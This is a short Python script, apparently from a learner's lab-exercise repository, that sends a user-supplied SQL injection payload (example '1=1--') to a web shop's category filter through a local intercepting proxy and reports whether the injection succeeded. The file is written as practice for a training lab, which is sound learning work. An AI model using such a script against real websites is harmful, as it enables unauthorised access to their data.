#!/usr/bin/env python3


### Author : @Cyb3rKat
### Description: even though some of these scripts seem a little too basic its assential to develope a Great foundation and work your way up the ladder , by scripting every lab Execrise i am hoping to increase my scripting skills so that if some day i need to write a complex script i feel right at home , so if this is something that you are intrested in, feel free to readthrough, Edit , And use any of the Scripts in this Repo.


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli(url,payload):
    uri= "/filter?category="
    r = requests.get(url + uri + payload, verify=False , proxies=proxies)
    print(r)
    if "Single Use" in r.text:
        return True
    else:
        return False


if __name__ == '__main__':

    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.exampe.com "1=1--"')
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("[*] SQL INJECTION SUCCESSFUL!")
    else:
        print("[-] SQL Injection unsuccessful")












